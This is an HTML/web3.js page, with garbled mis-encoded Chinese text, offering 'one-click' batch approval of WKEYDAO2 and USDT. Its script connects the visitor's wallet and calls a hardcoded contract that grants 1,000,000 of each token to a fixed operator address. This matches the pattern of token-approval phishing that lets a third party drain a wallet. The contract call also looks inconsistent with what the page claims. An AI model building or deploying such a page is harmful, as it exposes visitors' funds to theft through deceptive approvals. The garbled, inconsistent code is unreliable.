<!DOCTYPE html>
<html>
<head>
    <title>åŒä»£å¸æ‰¹é‡æˆæƒ</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; font-size: 18px; cursor: pointer; border-radius: 5px; }
        .info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; font-size: 14px; word-break: break-all; }
        .result { margin-top: 20px; padding: 15px; border-radius: 5px; display: none; }
        .contract-box { background: #f5f5f5; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; margin: 15px 0; border: 1px solid #ddd; }
    </style>
</head>
<body>
    <div class="container">
        <h2>âœ¨ ä¸€é”®æˆæƒ WKEYDAO2 + USDT</h2>
        
        <div class="info">
            <strong>ğŸ“‹ æœ¬æ¬¡æˆæƒä¿¡æ¯ï¼š</strong><br>
            â€¢ æ“ä½œå‘˜åœ°å€ï¼š<code>0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b</code><br>
            â€¢ WKEYDAO2ï¼š<code>0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E</code><br>
            â€¢ USDTï¼š<code>0x55d398326f99059ff775485246999027b3197955</code><br>
            â€¢ æˆæƒé¢åº¦ï¼šå„ <strong>1,000,000</strong> ä¸ª<br>
            â€¢ æ‰¹é‡åˆçº¦ï¼šå·²å†…ç½®ï¼Œæ— éœ€å¡«å†™
        </div>
        
        <div class="contract-box">
            ğŸ”— åˆçº¦åœ°å€ï¼š<strong>0x62B5E69a0a97109Fe0BfC243E02673D293D7c921</strong>
        </div>
        
        <button onclick="batchApprove()">ğŸ”¥ ç‚¹å‡»ç›´æ¥æˆæƒä¸¤ä¸ªä»£å¸</button>
        
        <div id="result" class="result"></div>
    </div>

    <script>
        // åˆçº¦åœ°å€å·²å†…ç½®
        const CONTRACT_ADDRESS = '0x62B5E69a0a97109Fe0BfC243E02673D293D7c921';
        
        const SPENDER = '0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b';
        const TOKENS = [
            '0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E',  // WKEYDAO2
            '0x55d398326f99059ff775485246999027b3197955'   // USDT
        ];
        const AMOUNT = '1000000';  // 100ä¸‡

        const BATCH_ABI = [{
            "inputs": [
                {"internalType": "address[]", "name": "_tokens", "type": "address[]"},
                {"internalType": "address", "name": "_spender", "type": "address"},
                {"internalType": "uint256[]", "name": "_amounts", "type": "uint256[]"}
            ],
            "name": "batchApprove",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }];

        async function batchApprove() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = 'â³ è¿æ¥é’±åŒ…ä¸­...';
            
            try {
                if (!window.ethereum) throw new Error('è¯·å®‰è£… MetaMask æˆ–ä½¿ç”¨æ”¯æŒ Web3 çš„é’±åŒ…');
                
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                
                resultDiv.innerHTML += `<br>âœ… å·²è¿æ¥ï¼š${accounts[0].substring(0,10)}...`;
                
                const amountInWei = web3.utils.toWei(AMOUNT, 'ether');
                const amounts = [amountInWei, amountInWei];
                
                const contract = new web3.eth.Contract(BATCH_ABI, CONTRACT_ADDRESS);
                
                resultDiv.innerHTML += '<br>â³ ä¼°ç®— Gas ä¸­...';
                const gasEstimate = await contract.methods.batchApprove(TOKENS, SPENDER, amounts).estimateGas({ from: accounts[0] });
                
                resultDiv.innerHTML += `<br>â³ Gas ä¼°ç®—ï¼š${gasEstimate}ï¼Œè¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤...`;
                
                const tx = await contract.methods.batchApprove(TOKENS, SPENDER, amounts).send({
                    from: accounts[0],
                    gas: Math.floor(gasEstimate * 1.2)
                });
                
                resultDiv.innerHTML = `
                    âœ… æ‰¹é‡æˆæƒæˆåŠŸï¼<br>
                    äº¤æ˜“å“ˆå¸Œï¼š<a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">${tx.transactionHash}</a><br>
                    å·²åŒæ—¶æˆæƒ WKEYDAO2 å’Œ USDT å„ 1,000,000 ä¸ªç»™æ“ä½œå‘˜åœ°å€
                `;
                resultDiv.style.background = '#e8f5e8';
                
            } catch (error) {
                resultDiv.innerHTML = `âŒ å¤±è´¥ï¼š${error.message}`;
                resultDiv.style.background = '#ffebee';
            }
        }
    </script>
</body>
</html>